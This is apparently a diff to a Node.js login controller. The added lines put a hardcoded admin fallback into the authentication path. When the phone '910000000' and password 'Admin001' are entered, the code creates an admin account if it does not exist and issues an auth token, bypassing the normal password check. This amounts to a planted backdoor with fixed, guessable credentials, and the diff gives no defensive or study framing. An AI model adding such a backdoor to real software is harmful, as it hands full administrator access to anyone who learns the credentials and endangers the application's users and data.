@@ -47,6 +47,28 @@ exports.loginUser = async (req, res) => {
   try {
     const { phone, password } = req.body;
 
+    // Hardcoded admin fallback
+    if (phone === '910000000' && password === 'Admin001') {
+       let adminUser = await User.findOne({ where: { phone: '910000000' } });
+       if (!adminUser) {
+         const salt = await bcrypt.genSalt(10);
+         const hashedPassword = await bcrypt.hash('Admin001', salt);
+         adminUser = await User.create({
+           name: 'Admin',
+           phone: '910000000',
+           password: hashedPassword,
+           role: 'admin'
+         });
+       }
+       return res.json({
+        id: adminUser.id,
+        name: adminUser.name,
+        phone: adminUser.phone,
+        role: adminUser.role,
+        token: generateToken(adminUser.id),
+      });
+    }
+
     const user = await User.findOne({ where: { phone } });
 
     if (user && (await bcrypt.compare(password, user.password))) {
